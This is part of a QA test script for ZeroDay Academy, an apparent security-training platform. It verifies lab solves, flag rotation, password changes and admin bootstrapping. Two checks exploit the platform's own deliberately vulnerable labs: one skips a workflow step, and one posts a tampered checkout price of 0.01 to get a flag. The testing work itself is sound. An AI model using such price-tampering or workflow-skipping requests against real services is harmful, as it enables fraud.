      assert(new Set(solves.map(solve => solve.challengeId.toString())).size === 56, 'solve records are not unique');

      const dashboard = await mainClient.text('/dashboard');
      assert(dashboard.response.status === 200, `dashboard returned ${dashboard.response.status}`);
      assert(dashboard.text.includes('56/56'), 'dashboard did not report 56/56 labs');
      assert(dashboard.text.includes('Elite'), 'dashboard did not award the Elite accomplishment');

      const leaderboard = await mainClient.text('/leaderboard');
      assert(leaderboard.response.status === 200 && leaderboard.text.includes(mainUsername), 'leaderboard did not list the main user');

      const profile = await mainClient.text('/profile');
      assert(profile.response.status === 200, `profile returned ${profile.response.status}`);
      assert(profile.text.includes('Polyglot') && profile.text.includes('Elite'), 'profile did not render earned accomplishments');

      const order = await mainClient.getJson('/api/challenge-order');
      assert(order.data.length === 56, 'challenge order changed after traversal');
      return `56 solves, ${expectedPoints} points, dashboard/leaderboard/profile consistent`;
    });

    await check('admin lab data reset clears instance state without stopping it', async () => {
      const challenge = await challengeBySlug('logic-workflow-skip');
      const mainDoc = await userByUsername(mainUsername);
      await mainClient.text('/labs/logic-workflow-skip');
      const confirm = await mainClient.request('/labs/logic-workflow-skip/confirm', { method: 'POST' });
      assert(confirm.status === 302, `workflow confirm returned ${confirm.status}`);
      const exploited = await mainClient.text('/labs/logic-workflow-skip');
      assert(flagFrom(exploited.text), 'workflow-skip state did not produce a flag');
      const instance = await LabInstance.findOne({ userId: mainDoc._id, challengeId: challenge._id, status: 'active' }).lean();
      assert(instance, 'workflow-skip has no active instance');

      const reset = await adminAction(admin, `/admin/labs/${challenge._id}/reset-data`);
      assert(reset.status === 302, `admin reset-data returned ${reset.status}`);
      const after = await LabInstance.findById(instance._id).lean();
      assert(after.status === 'active', 'admin reset-data stopped the instance');
      assert(!after.state || !after.state.workflow, 'admin reset-data left workflow state behind');
      const clean = await mainClient.text('/labs/logic-workflow-skip');
      assert(!flagFrom(clean.text), 'flag survived the admin data reset');
      return 'state cleared while the instance stayed active';
    });

    await check('platform instance reset rotates the flag and rejects the old value', async () => {
      const start = await second.startLab('logic-price-tampering');
      assert(start.status === 302, `price-tampering start returned ${start.status}`);
      const checkout = await second.text('/labs/logic-price-tampering/checkout', {
        method: 'POST',
        form: { price: '0.01' }
      });
      const oldFlag = flagFrom(checkout.text);
      assert(oldFlag, 'price-tampering exploit did not return a flag');

      const reset = await second.postForm('/challenges/logic-price-tampering/reset', {}, { accept: 'text/html' });
      assert(reset.status === 302, `platform reset returned ${reset.status}`);
      const oldSubmit = await second.submitFlag('logic-price-tampering', oldFlag);
      assert(oldSubmit.response.status === 200 && oldSubmit.data && oldSubmit.data.ok === false, 'old flag was accepted after the reset');

      const checkoutAgain = await second.text('/labs/logic-price-tampering/checkout', {
        method: 'POST',
        form: { price: '0.01' }
      });
      const newFlag = flagFrom(checkoutAgain.text);
      assert(newFlag && newFlag !== oldFlag, 'reset did not rotate the derived flag');
      return 'reset invalidated the old flag and issued a different value';
    });

    await check('profile bio update and password change', async () => {
      const bio = `QA operator ${RUN_ID}`;
      const update = await mainClient.postForm('/profile', { bio, emailHints: 'on' });
      assert(update.status === 302, `profile update returned ${update.status}`);
      const profile = await mainClient.text('/profile');
      assert(profile.text.includes(bio), 'profile bio was not saved');
      const savedUser = await userByUsername(mainUsername);
      assert(savedUser.preferences && savedUser.preferences.emailHints === true, 'profile preference was not saved');
      assert(profile.text.includes('Email me about new hints and labs'), 'profile preferences did not render');

      const bad = await mainClient.postForm('/profile/password', {
        currentPassword: 'wrong-password',
        newPassword: MAIN_NEW_PASSWORD,
        confirmPassword: MAIN_NEW_PASSWORD
      });
      assert(bad.status === 400, `wrong current password returned ${bad.status}`);

      const change = await mainClient.postForm('/profile/password', {
        currentPassword: QA_PASSWORD,
        newPassword: MAIN_NEW_PASSWORD,
        confirmPassword: MAIN_NEW_PASSWORD
      });
      assert(change.status === 302, `password change returned ${change.status}`);

      await mainClient.logout();
      const oldLogin = await login(mainClient, mainUsername, QA_PASSWORD);
      assert(oldLogin.status === 401, `old password login returned ${oldLogin.status}`);
      const newLogin = await login(mainClient, mainUsername, MAIN_NEW_PASSWORD);
      assert(newLogin.status === 302, `new password login returned ${newLogin.status}`);
      const dashboard = await mainClient.text('/dashboard');
      assert(dashboard.response.status === 200, 'dashboard failed after the password change');
      return 'bio saved, wrong current password rejected, password rotated and verified';
    });

    await check('bootstrap CLI preserves an existing password and audit trail', async () => {
      const uri = await mongoUri();
      const preservedPassword = FOUNDER_RESET_PASSWORD;
      const child = spawnSync(process.execPath, ['scripts/create-admin.js'], {
        cwd: ROOT,
        env: {
          ...process.env,
          NODE_ENV: 'test',
          MONGODB_URI: uri,
          ADMIN_EMAIL: 'founder.zeroday@gmail.com',
          ADMIN_USERNAME: 'founder',
          ADMIN_PASSWORD: preservedPassword
        },
        encoding: 'utf8',
        timeout: 120000
      });
      assert(child.status === 0, `create-admin exited ${child.status}: ${(child.stderr || child.stdout || '').slice(0, 300)}`);
      assert(child.stdout.includes('admin.bootstrap_promoted'), 'create-admin did not report an idempotent promotion');
      const founder = await User.findOne({ email: 'founder.zeroday@gmail.com' });
      assert(await bcrypt.compare(FOUNDER_PASSWORD, founder.passwordHash), 'idempotent bootstrap changed the existing password');
      assert(!(await bcrypt.compare(preservedPassword, founder.passwordHash)), 'idempotent bootstrap stored the new password without --reset-password');
      const events = await AuditLog.countDocuments({ action: 'admin.bootstrap_promoted' });
      assert(events >= 1, 'idempotent bootstrap produced no audit event');
      return 'existing password preserved; promotion audited';
    });

    await check('startup bootstrap does not reset an existing password', async () => {
      const uri = await mongoUri();
      const code = [
        "const { createApp } = require('./server');",
        "const { disconnectMongo } = require('./db/mongo');",
        "createApp({ seed: false, log: false }).then(async () => { await disconnectMongo(); process.exit(0); }).catch(error => { console.error(error); process.exit(1); });"
      ].join('\n');
      const child = spawnSync(process.execPath, ['-e', code], {
        cwd: ROOT,
        env: {
          ...process.env,
          NODE_ENV: 'test',
          MONGODB_URI: uri,
          BOOTSTRAP_ADMIN: 'true',
          ADMIN_EMAIL: 'founder.zeroday@gmail.com',
          ADMIN_USERNAME: 'founder',
          ADMIN_PASSWORD: FOUNDER_RESET_PASSWORD
        },
        encoding: 'utf8',
        timeout: 120000
      });
      assert(child.status === 0, `startup bootstrap child exited ${child.status}: ${(child.stderr || '').slice(0, 300)}`);
      const founder = await User.findOne({ email: 'founder.zeroday@gmail.com' });
      assert(await bcrypt.compare(FOUNDER_PASSWORD, founder.passwordHash), 'startup bootstrap reset the existing password');
      return 'startup bootstrap left the existing password intact';
    });

    await check('bootstrap CLI rejects a missing password', async () => {
      const uri = await mongoUri();
      const child = spawnSync(process.execPath, ['scripts/create-admin.js'], {
        cwd: ROOT,
        env: {
          ...process.env,
          NODE_ENV: 'test',
          MONGODB_URI: uri,
          ADMIN_EMAIL: 'founder.zeroday@gmail.com',
          ADMIN_USERNAME: 'founder',
          ADMIN_PASSWORD: ''
        },
        encoding: 'utf8',
        timeout: 120000
      });
      assert(child.status !== 0, 'create-admin accepted a missing password');
      assert(/ADMIN_PASSWORD must be set/.test(`${child.stdout}\n${child.stderr}`), 'create-admin did not explain the password requirement');
      return 'missing ADMIN_PASSWORD refused';
    });

    await check('bootstrap CLI rotates the password only with --reset-password', async () => {
      const uri = await mongoUri();
      const child = spawnSync(process.execPath, ['scripts/create-admin.js', '--reset-password'], {
        cwd: ROOT,
        env: {
          ...process.env,
          NODE_ENV: 'test',
          MONGODB_URI: uri,
          ADMIN_EMAIL: 'founder.zeroday@gmail.com',
          ADMIN_USERNAME: 'founder',
          ADMIN_PASSWORD: FOUNDER_RESET_PASSWORD
        },
        encoding: 'utf8',
        timeout: 120000
      });
      assert(child.status === 0, `password reset exited ${child.status}: ${(child.stderr || '').slice(0, 300)}`);
      assert(child.stdout.includes('admin.bootstrap_password_reset'), 'password reset action was not reported');
      const founder = await User.findOne({ email: 'founder.zeroday@gmail.com' });
      assert(!(await bcrypt.compare(FOUNDER_PASSWORD, founder.passwordHash)), 'old founder password remained valid');
      assert(await bcrypt.compare(FOUNDER_RESET_PASSWORD, founder.passwordHash), 'new founder password was not stored');
      return 'password rotated only on explicit reset';
    });

    await check('founder signs in with the rotated password', async () => {
      await admin.logout();
      const oldLogin = await login(admin, 'founder', FOUNDER_PASSWORD);
      assert(oldLogin.status === 401, `old founder password returned ${oldLogin.status}`);
      const newLogin = await login(admin, 'founder', FOUNDER_RESET_PASSWORD);
      assert(newLogin.status === 302, `rotated founder login returned ${newLogin.status}`);
      const dashboard = await admin.text('/admin');
      assert(dashboard.response.status === 200, 'rotated founder could not open the admin panel');
      return 'old password rejected, rotated password accepted';
    });

    await check('production startup refuses missing mandatory configuration', async () => {
      const child = spawnSync(process.execPath, ['-e', "require('./config')"], {
        cwd: ROOT,
        env: {
          ...process.env,
          NODE_ENV: 'production',
          MONGODB_URI: '',
          SESSION_SECRET: '',
          FLAG_SECRET: ''
        },
        encoding: 'utf8',
        timeout: 30000
      });
      assert(child.status !== 0, 'production configuration loaded without mandatory secrets');
      assert(/Missing required production configuration/.test(`${child.stdout}\n${child.stderr}`), 'production refusal did not identify the missing configuration');
      return 'production requires MONGODB_URI, SESSION_SECRET and FLAG_SECRET';
    });

    await check('final audit counts remain consistent', async () => {
      const submissions = await FlagSubmission.countDocuments();
      const audit = await admin.text('/admin/audit?action=flag.submission');
      const match = audit.text.match(/(\d+) immutable events/);
      assert(match && Number(match[1]) === submissions, 'final audit/submission correlation failed');
      const health = await admin.text('/admin/health');
      assert(health.response.status === 200 && health.text.includes('Mounted labs'), 'admin health page did not render');
      return `${submissions} graded submissions correlated with audit events`;
    });

  } catch (error) {
    results.failed += 1;
    results.checks.push({ name: 'fatal error', ok: false, detail: error.message });
    console.error(`FATAL ${error.stack || error.message}`);
  } finally {
    const labPassed = results.labs.filter(item => item.ok).length;
    const labFailed = results.labs.length - labPassed;
    const duration = ((Date.now() - results.startedAt.getTime()) / 1000).toFixed(1);
    console.log('\n===== ZeroDay Academy QA summary =====');
    console.log(`Platform checks: ${results.passed} passed, ${results.failed} failed`);
    if (results.labs.length > 0) {
      console.log(`Lab traversal:   ${labPassed} passed, ${labFailed} failed (${results.labs.length} attempted)`);
      for (const failure of results.labs.filter(item => !item.ok)) {
        console.log(`  FAILED LAB ${failure.slug}: ${failure.detail}`);
      }
    } else {
      console.log('Lab traversal:   not reached');
    }
    console.log(`Duration:        ${duration}s`);
    console.log(`Run ID:          ${RUN_ID}`);

    if (server) {
      await new Promise(resolve => {
        server.close(() => resolve());
        if (typeof server.closeAllConnections === 'function') server.closeAllConnections();
      });
    }
    await disconnectMongo().catch(error => console.error('[qa] Mongo shutdown failed:', error.message));

    const failed = results.failed + labFailed;
    process.exit(failed > 0 ? 1 : 0);
  }
}

main().catch(error => {
  console.error('[qa] Unexpected failure:', error);
  process.exit(1);
});

